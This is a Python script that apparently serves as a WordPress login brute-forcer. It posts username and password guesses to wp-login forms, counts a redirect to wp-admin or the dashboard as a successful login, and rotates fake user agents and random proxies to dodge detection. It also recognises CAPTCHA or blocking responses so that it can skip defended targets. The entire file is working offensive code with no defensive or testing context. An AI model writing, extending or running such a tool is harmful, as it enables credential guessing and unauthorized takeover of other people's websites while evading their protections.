import requests
import random

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
        "Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6)",
    ]
    return random.choice(user_agents)

def is_wordpress_login(url, proxies=None):
    try:
        headers = {
            'User-Agent': get_random_user_agent()
        }
        proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
        r = requests.get(url, headers=headers, proxies=proxy, timeout=10, allow_redirects=True)
        if "wp-login.php" in r.text.lower() or "wordpress" in r.text.lower():
            return True
        return False
    except:
        return False

def is_blocked(r):
    if r.status_code in [403, 503]:
        return True
    if "captcha" in r.text.lower() or "blocked" in r.text.lower():
        return True
    return False

def brute_force(url, username, password, proxies=None):
    try:
        proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
        headers = {
            "User-Agent": get_random_user_agent()
        }
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": url,
            "testcookie": "1"
        }
        r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10, allow_redirects=True)

        if is_blocked(r):
            print(f"[-] Blocked or CAPTCHA detected on {url}, skipping...")
            return False

        if "dashboard" in r.url.lower() or "wp-admin" in r.url.lower():
            return True
        
        if "logout" in r.text.lower() or "profile" in r.text.lower():
            return True

        return False
    except Exception:
        return False
